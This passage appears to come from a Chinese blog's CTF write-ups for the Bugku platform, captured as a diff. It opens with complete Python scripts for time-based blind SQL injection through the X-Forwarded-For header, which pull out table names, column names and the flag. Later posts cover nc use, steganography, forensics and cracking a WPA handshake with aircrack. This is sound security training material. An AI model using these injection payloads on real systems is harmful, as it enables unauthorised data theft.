TABLE_SCHEMA='&#123;0&#125;')='&#123;1&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="comment">#猜解表名字长度的payload，注：其实也可不猜解长度，直接猜解具体字符，当发现名称字符串不变时(即不再捕获到ReadTimeout异常添加字符时)说明猜解完成</span></span><br><span class="line">payload_tb_name_len = <span class="string">"1'+(select case when (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;' limit 1 offset &#123;1&#125;) = '&#123;2&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="comment">#猜解表名字的payload</span></span><br><span class="line">payload_tb_name = <span class="string">"1'+(select case when (substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='&#123;0&#125;' limit 1 offset &#123;1&#125;) from &#123;2&#125; for 1)) = '&#123;3&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web15/'</span></span><br><span class="line"></span><br><span class="line">db_name = <span class="string">''</span> </span><br><span class="line"><span class="comment">#数据库名破解</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">6</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_db.format(i,j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            print(payload_db.format(i,j))</span><br><span class="line">            db_name += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'db_name: '</span> + db_name) <span class="comment">#运行后可知数据库名为web15</span></span><br><span class="line"><span class="comment">#表数量破解</span></span><br><span class="line">tb_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_num.format(db_name,str(i))&#125;</span><br><span class="line">        res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        tb_num = i</span><br><span class="line">        print(<span class="string">'tb_num: '</span>+str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#运行后可知有两个表</span></span><br><span class="line"><span class="comment">#表名破解</span></span><br><span class="line">len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(tb_num):</span><br><span class="line">    <span class="comment">#crack length first</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_name_len.format(db_name,i,j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            len = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">'No.'</span>+str(i+<span class="number">1</span>)+<span class="string">' table has length: '</span> + str(len))</span><br><span class="line">    <span class="comment">#crack name</span></span><br><span class="line">    tb_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_tb_name.format(db_name,i,k,j)&#125;</span><br><span class="line">                res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                print(payload_tb_name.format(db_name,i,k,j))</span><br><span class="line">                tb_name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        print(tb_name)</span><br><span class="line">	<span class="comment">#运行后可知两个表为flag和client_ip</span></span><br></pre></td></tr></table></figure>
-<p>猜解列：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#crack column number 运行后可知仅有1列</span></span><br><span class="line">target_db = <span class="string">'web15'</span></span><br><span class="line">target_tb = <span class="string">'flag'</span></span><br><span class="line">col_num = <span class="number">0</span></span><br><span class="line">payload_col_num = <span class="string">"1'+(select case when (select count(*) from information_schema.COLUMNS where TABLE_SCHEMA='&#123;0&#125;' and TABLE_NAME='&#123;1&#125;') = '&#123;2&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line">payload_col_len = <span class="string">"1'+(select case when (select length(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA='&#123;0&#125;' and TABLE_NAME='&#123;1&#125;' limit 1 offset &#123;2&#125;) = '&#123;3&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line">payload_col_name = <span class="string">"1'+(select case when (substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='&#123;0&#125;' and TABLE_NAME='&#123;1&#125;' limit 1 offset &#123;2&#125;) from &#123;3&#125; for 1)) = '&#123;4&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_col_num.format(target_db,target_tb,i)&#125;</span><br><span class="line">        res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        col_num = i</span><br><span class="line">        print(<span class="string">'col_num='</span> + str(col_num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#crack column name</span></span><br><span class="line">len = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (col_num):</span><br><span class="line">    <span class="comment">#crack column length 运行后可知长度为4</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_col_len.format(target_db,target_tb,i,j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            len = j</span><br><span class="line">            print(<span class="string">'No.'</span> + str(i+<span class="number">1</span>) + <span class="string">' length : '</span> + str(len))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment">#crack name 运行后可知列名字为flag</span></span><br><span class="line">    col_name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>,len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers = &#123;<span class="string">'x-forwarded-for'</span>:payload_col_name.format(target_db,target_tb,i,k,j)&#125;</span><br><span class="line">                res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                col_name += j</span><br><span class="line">                print(col_name)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-<p>猜解flag：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">dic=<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUZWXYZ_'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get content 猜解flag</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">paylaod_content = <span class="string">"1'+(select case when (substr((select flag from flag) from &#123;0&#125; for 1)) = '&#123;1&#125;' then sleep(6) else 1 end)+'1"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = &#123;<span class="string">'x-forwarded-for'</span>:paylaod_content.format(i,j)&#125;</span><br><span class="line">            res = requests.get(url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">            print(paylaod_content.format(i,j))</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
-
-<p>后面附上大佬们的wp链接：<br><a href="https://blog.csdn.net/jlu16/article/details/86264633" target="_blank" rel="noopener">bugku—INSERT INTO注入解答 - Just for funnnnnnnnnnnn - CSDN博客</a><br><a href="https://www.cnblogs.com/sijidou/p/9657026.html" target="_blank" rel="noopener">bugku web题INSERT INTO注入 - sijidou - 博客园</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-	<div>
-		
-	</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Bugku%20pwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ChanCherry">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ChanCherry's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/03/Bugku%20pwn/" class="post-title-link" itemprop="url">Bugku pwn</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:37:55" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF WP</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <a id="more"></a>
-
-<h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p>在Linux里面输入以下命令，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 114.116.54.89 10001	&#x2F;&#x2F;nc用于设置路由器</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
-<p>然后cat flag，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20190825204438222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="nc命令"><a href="#nc命令" class="headerlink" title="nc命令"></a>nc命令</h2><p>nc命令是一个功能打包的网络实用程序，它通过命令行在网络上读取和写入数据;nc是为NMAP项目编写的，是目前已分裂的netcat家族的顶峰,它被设计成一个可靠的后端工具，可以立即为其他用户提供网络连接应用程序和用户。nc不仅可以使用IPv4和IPv6，而且可以为用户提供无限的潜在用途。</p>
-<p>在nc的大量功能中，有能力将nc链接在一起；TCP、UDP和到其他站点的SCTP端口；支持SSL；通过socks4或HTTP代理（带有可选代理）进行代理连接身份验证）;一些一般原则适用于大多数应用程序，因此使您能够立即向通常不支持它的软件添加网络支持。<br>nc命令用法详解见<a href="https://www.cnblogs.com/nmap/p/6148306.html" target="_blank" rel="noopener">博客</a></p>
-
-      
-    </div>
-
-    
-    
-    
-
-	<div>
-		
-	</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/Bugku%E6%9D%82%E9%A1%B9%20wp2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ChanCherry">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ChanCherry's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/03/Bugku%E6%9D%82%E9%A1%B9%20wp2/" class="post-title-link" itemprop="url">Bugku misc wp2</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：15:38:27" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF-WP/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF WP</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <a id="more"></a>
-
-<h1 id="闪的好快"><a href="#闪的好快" class="headerlink" title="闪的好快"></a>闪的好快</h1><p>gif动图，用stegsolve打开，然后Analysis-&gt;Frame Browser。<br><img src="https://img-blog.csdnimg.cn/2019100319032775.png" alt="在这里插入图片描述"><br>共有18帧，拿着手机一张一张扫，扫出来的结果是<code>SYC{F1aSh-so-f4sT}</code><br>但是提交不正确。最后更改为<code>SYC{F1aSh_so_f4sT}</code></p>
-<h1 id="come-game"><a href="#come-game" class="headerlink" title="come_game"></a>come_game</h1><p>下载下来，发现是一个游戏<br><img src="https://img-blog.csdnimg.cn/20191003195332323.png" alt="在这里插入图片描述"><br>运行.exe文件，进入游戏界面，按照界面提示，shift键和上下左右键控制游戏<br><img src="https://img-blog.csdnimg.cn/20191003200045880.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>随便玩一下，ESC键退出游戏。发现文件夹中多出了两个文件， 死亡就是deathtime  其中save1中的后缀1表示存储第一个游戏关卡的进度。<br><img src="https://img-blog.csdnimg.cn/20191003202101236.png" alt="在这里插入图片描述"><br>用FlexHex打开save1看看，然后发现这里2就是代表关卡的意思。我们这里修改成5也就是对应的35。而且后面的数字都要改为0，不然就会在重新进入的时候，既出现flag又出现gameover的图片。<br><img src="https://img-blog.csdnimg.cn/20191003202559435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改之后重新进入游戏，此时因为游戏进度被我们人为更改，所以要加载游戏才能直接通关。得到flag:<code>FLAG{6E23F259D98DF153}</code>，<br><img src="https://img-blog.csdnimg.cn/20191003205820174.png" alt="在这里插入图片描述"><br>但是提交不正确，主要的原因是本题来自于极客大挑战，其flag格式为SYC{}，要改为<code>SYC{6E23F259D98DF153}</code></p>
-<h1 id="白哥的鸽子"><a href="#白哥的鸽子" class="headerlink" title="白哥的鸽子"></a>白哥的鸽子</h1><p>放到winHex里面看看，感觉结尾有点奇怪<br><img src="https://img-blog.csdnimg.cn/20191004002655800.png" alt="在这里插入图片描述"><br>看了wp之后，知道是栅栏密码，上脚本，</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3个字符一组，一共24个字符，总共8组</span></span><br><span class="line">str = <span class="string">"fg2ivyo&#125;l&#123;2s3_o@aw__rcl@"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, int(len(str)/<span class="number">3</span>), <span class="number">1</span>):</span><br><span class="line">    flag += str[i]</span><br><span class="line">    flag += str[i + <span class="number">8</span>]</span><br><span class="line">    flag += str[i + <span class="number">16</span>]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-<p>运行脚本即可得到flag。</p>
-<h1 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h1><p>给的是大白的图，但是下面被截断了，IHDR后面8个字节是宽和高，把高改为宽的值。<br><img src="https://img-blog.csdnimg.cn/20191004084137294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>题目给的是1.tar.gz，在Linux里面解压，</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf <span class="number">1.</span>tar.gz</span><br><span class="line">test/</span><br><span class="line">test/flag</span><br></pre></td></tr></table></figure>
-<p>看来flag在flag文件里面，进入目录，用strings命令查看，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;文档# cd test</span><br><span class="line">root@kali:~&#x2F;文档&#x2F;test# strings flag</span><br><span class="line">[WI&#x2F;</span><br><span class="line">xy#^</span><br><span class="line">&#x2F;media&#x2F;test</span><br><span class="line">lost+found</span><br><span class="line">game</span><br><span class="line">.Trash-0</span><br><span class="line">flag.txt</span><br><span class="line">.goutputstream-LSCRJY</span><br><span class="line">[WI&#x2F;</span><br><span class="line">xy#^</span><br><span class="line">[WI&#x2F;</span><br><span class="line">xy#^</span><br><span class="line">&#x2F;media&#x2F;test</span><br><span class="line">info</span><br><span class="line">files</span><br><span class="line">lost+found</span><br><span class="line">game</span><br><span class="line">.Trash-0</span><br><span class="line">game.trashinfo</span><br><span class="line">game.trashinfo.OL1PJY</span><br><span class="line">game</span><br><span class="line">[WI&#x2F;</span><br><span class="line">xy#^</span><br><span class="line">&#x2F;media&#x2F;test</span><br><span class="line">lost+found</span><br><span class="line">game</span><br><span class="line">.Trash-0</span><br><span class="line">flag.txt</span><br><span class="line">lost+found</span><br><span class="line">game</span><br><span class="line">.Trash-0</span><br><span class="line">flag.txt</span><br><span class="line">.goutputstream-3ICRJY</span><br><span class="line">lost+found</span><br><span class="line">game</span><br><span class="line">.Trash-0</span><br><span class="line">flag.txt</span><br><span class="line">.goutputstream-PS93JY</span><br><span class="line">[WI&#x2F;</span><br><span class="line">xy#^</span><br><span class="line">&#x2F;media&#x2F;test</span><br><span class="line">lost+found</span><br><span class="line">game</span><br><span class="line">.Trash-0</span><br><span class="line">flag.txt</span><br><span class="line">.goutputstream-PS93JY</span><br><span class="line">[WI&#x2F;</span><br><span class="line">xy#^</span><br><span class="line">&#x2F;media&#x2F;test</span><br><span class="line">lost+found</span><br><span class="line">game</span><br><span class="line">.Trash-0</span><br><span class="line">flag.txt</span><br><span class="line">.goutputstream-LSCRJY</span><br><span class="line">lost+found</span><br><span class="line">game</span><br><span class="line">.Trash-0</span><br><span class="line">flag.txt</span><br><span class="line">.goutputstream-LSCRJY</span><br><span class="line">[WI&#x2F;</span><br><span class="line">xy#^</span><br><span class="line">&#x2F;media&#x2F;test</span><br><span class="line">[WI&#x2F;</span><br><span class="line">xy#^</span><br><span class="line">info</span><br><span class="line">files</span><br><span class="line">[Trash Info]</span><br><span class="line">Path&#x3D;game</span><br><span class="line">DeletionDate&#x3D;2016-06-27T12:27:37</span><br><span class="line">key&#123;&#125;</span><br><span class="line">key&#123;&#125;</span><br><span class="line">key&#123;feb81d3834e2423c9903f4755464060b&#125;</span><br><span class="line">game.trashinfo</span><br><span class="line">game.trashinfo.OL1PJY</span><br><span class="line">game</span><br></pre></td></tr></table></figure>
-<p>或者<code>grep &#39;key&#39; -a flag</code>也可以</p>
-<h1 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h1><p>下载文件下来，是一个jar，用反编译工具jd-gui查看一下源代码，<br><img src="https://img-blog.csdnimg.cn/20191005191818125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到flag，不过经过了base64加密，解密一下即可。</p>
-<h1 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag格式：flag&#123;你破解的WiFi密码&#125;</span><br><span class="line"></span><br><span class="line">tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你</span><br><span class="line"><span class="number">1391040</span>**</span><br><span class="line">Goodluck!!</span><br></pre></td></tr></table></figure>
-<p>下载cap包，用wireshark打开，WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下<br><img src="https://img-blog.csdnimg.cn/20191007091732404.png" alt="在这里插入图片描述"><br>使用<a href="https://blog.csdn.net/qq_42025840/article/details/81125584" target="_blank" rel="noopener">crunch命令</a>生成密码字典，<br><img src="https://img-blog.csdnimg.cn/20191007092010317.png" alt="在这里插入图片描述"><br>利用aircrack爆破一下，<br><img src="https://img-blog.csdnimg.cn/20191007092303280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h1><p>解压后的文件拿到kali里面binwalk一下，再foremost得到一张flag图片，<br><img src="https://img-blog.csdnimg.cn/20191007082946497.png" alt="在这里插入图片描述"><br>flag{f0rens!cs!C00L!}提交，错误？？？<br>题目提示的是：</p>
-<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给你点提示吧：<span class="built_in">key</span>的格式是<span class="built_in">KEY</span>&#123;&#125;</span><br></pre></td></tr></table></figure>
-<p>尝试直接搜索brave文件，提交正确！<br><img src="https://img-blog.csdnimg.cn/20191007083304194.png" alt="在这里插入图片描述"><br>也可以直接用strings命令查看一下brave文件。</p>
-<p>还在做题中，后续还会更新的~~</p>
-
-      
-    </div>
-
-    
-    
-    
-
-	<div>
-		
-	</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/03/CSRF&SSRF%E7%AE%80%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="ChanCherry">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="ChanCherry's Blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/02/03/CSRF&SSRF%E7%AE%80%E6%9E%90/" class="post-title-link" itemprop="url">PHP伪协议</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2020-02-03 00:00:00 / 修改时间：16:02:36" itemprop="dateCreated datePublished" datetime="2020-02-03T00:00:00+08:00">2020-02-03</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">Web安全</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>记一下CSRF和SSRF的笔记~~</p>
+          <p>刷题~~</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2020/02/03/CSRF&SSRF%E7%AE%80%E6%9E%90/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
